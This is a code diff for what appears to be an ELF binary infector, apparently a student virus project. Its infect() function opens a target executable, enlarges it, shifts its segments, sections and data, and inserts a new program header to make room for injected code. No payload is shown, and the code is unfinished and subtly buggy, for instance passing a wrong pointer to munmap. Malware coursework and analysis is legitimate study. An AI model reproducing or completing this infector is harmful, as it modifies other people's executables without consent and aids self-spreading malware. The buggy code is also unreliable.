@@ -254,114 +254,105 @@ clean:
 }
 
 #define ELF_MAGIC			   0x464c457f
-#define MINIMAL_INJECTION_SIZE sizeof(ElfW(Phdr))
+#define MINIMAL_INJECTION_SIZE 0x1000
+#define inout
 
-void bump_segment(ElfW(Phdr) * segment, Elf64_Off insertion_start,
-				  Elf64_Half insertion_size, Elf64_Addr *entry)
+int parse_file(char *path, inout struct stat *statbuf, inout t_elf *elf,
+			   inout char **file_data)
 {
-}
+	int fd;
 
-void bump_section(ElfW(Shdr) * section, Elf64_Off insertion_start,
-				  Elf64_Half insertion_size)
-{
-}
-
-void relocate(char *file_data, off_t file_size, t_elf elf,
-			  Elf64_Off insertion_start, Elf64_Half insertion_size)
-{
-	ElfW(Dyn) * dynamic_table;
-
-	if (elf.header->e_phoff >= insertion_start)
-		elf.header->e_phoff += insertion_size;
-	if (elf.header->e_shoff >= insertion_start)
-		elf.header->e_shoff += insertion_size;
-	for (int i = 0; i < elf.header->e_phnum; i++)
-	{
-		if (elf.segments[i].p_type == PT_DYNAMIC)
-		{
-			// dynamic_table = (ElfW(Dyn) *) file_data +
-			// elf.segments[i].p_offset; while (dynamic_table->d_tag != DT_NULL)
-			// {
-			// 	switch (dynamic_table->d_tag)
-			// 	{
-			// 		// case constant expression:
-			// 		// 	/* code */
-			// 		// 	break;
-
-			// 	default:
-			// 		break;
-			// 	}
-			// }
-		}
-		if (elf.segments[i].p_offset >= insertion_start)
-			elf.segments[i].p_offset += insertion_size;
-		else if (elf.segments[i].p_offset + elf.segments[i].p_filesz
-				 > insertion_start)
-		{
-			elf.segments[i].p_filesz += insertion_size;
-			elf.segments[i].p_memsz += insertion_size;
-		}
-	}
-	write(1, "segments remaped\n", 17);
-	for (int i = 0; i < elf.header->e_shnum; i++)
-		if (elf.sections[i].sh_offset >= insertion_start)
-			elf.sections[i].sh_offset += insertion_size;
-		else if (elf.sections[i].sh_offset + elf.sections[i].sh_size
-				 >= insertion_start)
-			elf.sections[i].sh_size += insertion_size;
-	write(1, "sections remaped\n", 17);
-	ft_memmove(file_data + insertion_start + insertion_size,
-			   file_data + insertion_start, file_size - insertion_start);
-	write(1, "data moved\n", 0);
+	write(1, path, 12);
+	write(1, "\n", 1);
+	*file_data = NULL;
+	fd = ft_open(path, O_RDWR);
+	if (fd < 0 || ft_fstat(fd, statbuf) < 0)
+		goto error;
+	if (ft_ftruncate(fd, statbuf->st_size + MINIMAL_INJECTION_SIZE) < 0)
+		goto error;
+	*file_data
+		= (void *) ft_syscall(9, 0, statbuf->st_size + MINIMAL_INJECTION_SIZE,
+							  PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
+	if (*file_data == MAP_FAILED)
+		goto error;
+	if (statbuf->st_size < sizeof(ElfW(Ehdr))
+		|| ((unsigned *) *file_data)[0] != ELF_MAGIC)
+		goto error;
+	elf->header = (ElfW(Ehdr) *) *file_data;
+	if (statbuf->st_size < elf->header->e_shoff
+							   + elf->header->e_shnum * elf->header->e_shentsize
+		|| statbuf->st_size
+			   < elf->header->e_phoff
+					 + elf->header->e_phnum * elf->header->e_phentsize)
+		goto error;
+	elf->sections = (ElfW(Shdr) *) (*file_data + elf->header->e_shoff);
+	elf->segments = (ElfW(Phdr) *) (*file_data + elf->header->e_phoff);
+	return (OK);
+error:
+	ft_close(fd);
+	ft_munmap(file_data, statbuf->st_size + MINIMAL_INJECTION_SIZE);
+	return (KO);
 }
 
 void infect(char *path, void *begin_ptr)
 {
-	int			fd;
 	struct stat statbuf;
 	char	   *file_data;
 	t_elf		elf;
+	// ElfW(Phdr) the_rats;
 
-	// TODO: calculate injection_size from max align and
-	// MINIMAL_INJECTION_SIZE
-	write(1, path, 12);
-	write(1, "\n", 1);
-	file_data = NULL;
-	fd = ft_open(path, O_RDWR);
-	if (fd < 0 || ft_fstat(fd, &statbuf) < 0)
+	if (parse_file(path, &statbuf, &elf, &file_data))
 		goto clean;
-	if (ft_ftruncate(fd, statbuf.st_size + MINIMAL_INJECTION_SIZE) < 0)
-		goto clean;
-	file_data
-		= (void *) ft_syscall(9, 0, statbuf.st_size + MINIMAL_INJECTION_SIZE,
-							  PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
-	if (file_data == MAP_FAILED)
-		goto clean;
-	if (statbuf.st_size < sizeof(ElfW(Ehdr))
-		|| ((unsigned *) file_data)[0] != ELF_MAGIC)
-		goto clean;
-	elf.header = (ElfW(Ehdr) *) file_data;
-	if (statbuf.st_size < elf.header->e_shoff
-							  + elf.header->e_shnum * elf.header->e_shentsize
-		|| statbuf.st_size
-			   < elf.header->e_phoff
-					 + elf.header->e_phnum * elf.header->e_phentsize)
-		goto clean;
-	elf.sections = (ElfW(Shdr) *) (file_data + elf.header->e_shoff);
-	elf.segments = (ElfW(Phdr) *) (file_data + elf.header->e_phoff);
 	write(1, "target located\n", 15);
-	relocate(file_data, statbuf.st_size, elf,
-			 elf.header->e_phoff
-				 + elf.header->e_phentsize * elf.header->e_phnum,
-			 MINIMAL_INJECTION_SIZE);
-	ft_write(1, "relocated to the abyss\n", 23);
+	/*
+	 * We need to inject 2 things
+	 * 1/ PT_LOAD header
+	 * -> enlarge segment that cover the injection position (and move it to
+	 * unused space if conflict), also move the PT_PHDR if moving
+	 * 		-> check for PT_DYN and move the address that were in the moved one
+	 * -> move subsequent segments in file (minding the alignment)
+	 *
+	 * 2/ PT_LOAD data, je fais kinda ce que je veux je crois :D
+	 */
+	// the_rats = (ElfW(Phdr)) {.p_type = PT_NULL};
+	for (int i = 0; i < elf.header->e_phnum; i++)
+		if (elf.segments[i].p_offset
+			>= elf.header->e_phoff
+				   + elf.header->e_phnum * elf.header->e_phentsize)
+			elf.segments[i].p_offset += 0x1000;
+		else if (elf.segments[i].p_offset + elf.segments[i].p_filesz
+				 >= elf.header->e_phoff
+						+ elf.header->e_phnum * elf.header->e_phentsize)
+		{
+			elf.segments[i].p_filesz += sizeof(ElfW(Phdr));
+			elf.segments[i].p_memsz += sizeof(ElfW(Phdr));
+		}
+	for (int i = 0; i < elf.header->e_shnum; i++)
+	{
+		if (elf.sections[i].sh_offset
+			>= elf.header->e_phoff
+				   + elf.header->e_phnum * elf.header->e_phentsize)
+			elf.sections[i].sh_offset += 0x1000;
+		else if (elf.sections[i].sh_offset + elf.sections[i].sh_size
+				 >= elf.header->e_phoff
+						+ elf.header->e_phnum * elf.header->e_phentsize)
+			elf.sections[i].sh_size += sizeof(ElfW(Phdr));
+	}
+	ft_memmove(file_data + elf.header->e_phoff
+				   + elf.header->e_phnum * elf.header->e_phentsize + 0x1000,
+			   file_data + elf.header->e_phoff
+				   + elf.header->e_phnum * elf.header->e_phentsize,
+			   statbuf.st_size
+				   - (elf.header->e_phoff
+					  + elf.header->e_phnum * elf.header->e_phentsize));
 	ft_bzero(file_data + elf.header->e_phoff
-				 + elf.header->e_phentsize * elf.header->e_phnum,
-			 MINIMAL_INJECTION_SIZE);
+				 + elf.header->e_phnum * elf.header->e_phentsize,
+			 sizeof(ElfW(Phdr)));
+	if (elf.header->e_shoff
+		> elf.header->e_phoff + elf.header->e_phnum * elf.header->e_phentsize)
+		elf.header->e_shoff += 0x1000;
 	elf.header->e_phnum++;
-
 clean:
 	ft_msync(file_data, statbuf.st_size + MINIMAL_INJECTION_SIZE, MS_SYNC);
 	ft_munmap(file_data, statbuf.st_size + MINIMAL_INJECTION_SIZE);
-	ft_close(fd);
 }
